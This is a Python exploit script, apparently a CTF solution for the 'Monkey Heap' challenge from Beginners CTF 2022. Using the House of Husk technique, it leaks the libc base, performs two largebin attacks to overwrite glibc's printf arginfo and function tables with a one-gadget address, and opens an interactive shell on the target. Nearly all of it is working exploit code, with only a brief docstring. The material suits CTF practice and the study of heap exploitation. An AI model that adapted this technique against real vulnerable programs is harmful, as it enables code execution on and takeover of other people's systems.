"""
Monkey Heap - Beginners CTF 2022 Online
Solution with House of Husk

Pros:
- Only require libc address
- Simple to understand
Cons:
- Two largebin attack, or one largebin attack + large allocation required
- Require printf with format string
- Hard to control arguments
"""
from ptrlib import *

def add(index, size):
    assert size <= 0x600
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
def write(index, data):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", data)
def read(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    sock.recvuntil("papyrus: ")
    data = sock.recv()
    if data[-2:] == b'> ':
        data = data[:-2]
        sock.unget("> ")
    return data
def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", str(index))

libc = ELF("./libc.so.6")
sock = Socket("localhost", 9999)

# 1. Leak libc
add(1, 0x548) # victim
add(0, 0x508) # gap
add(2, 0x538)
add(0, 0x508) # gap
delete(1)
libc_base = u64(read(1)) - libc.main_arena() - 96
libc.set_base(libc_base)
input("> ")
addr_printf_function_table = libc_base + 0x21b9a8
addr_printf_arginfo_table = libc_base + 0x21a890

# 2. Largebin attack to overwrite arginfo table
add(0, 0x588)
delete(2)
payload  = p64(0) * 3
payload += p64(addr_printf_arginfo_table - 0x20)
write(1, payload)
add(0, 0x518)
payload  = p64(0xdeadbeef) * 0x71
payload += p64(libc_base + 0xeaed9) * 0x1
write(1, payload)

# 3. Largebin attack to overwrite function table
add(1, 0x598) # victim
add(0, 0x568) # gap
add(2, 0x588)
add(0, 0x568) # gap
delete(1)
add(0, 0x5a8) # link victim to largebin
delete(2)
payload  = p64(0) * 3
payload += p64(addr_printf_function_table - 0x20)
write(1, payload)
add(0, 0x578)

sock.interactive()
